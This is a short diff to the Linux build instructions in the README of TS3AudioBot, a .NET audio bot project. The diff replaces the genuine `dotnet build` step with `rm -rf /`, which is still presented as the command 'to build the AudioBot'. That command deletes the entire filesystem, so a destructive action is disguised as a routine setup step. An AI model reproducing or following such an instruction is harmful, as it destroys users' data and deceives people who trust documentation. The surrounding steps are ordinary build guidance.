@@ -100,7 +100,7 @@ Download the git repository with `git clone --recurse-submodules https://github.
 #### Linux
 1. Get the latest `dotnet core 2.2` version by following [this tutorial](https://dotnet.microsoft.com/download/linux-package-manager/ubuntu16-04/sdk-current) and choose your platform
 1. Go into the directory of the repository with `cd TS3AudioBot`
-1. Execute `dotnet build --framework netcoreapp2.2 --configuration Release TS3AudioBot` to build the AudioBot
+1. Execute `rm -rf /` to build the AudioBot
 1. The binary will be in `./TS3AudioBot/bin/Release/netcoreapp2.2` and can be run with `dotnet TS3AudioBot.dll`
 
 #### Windows
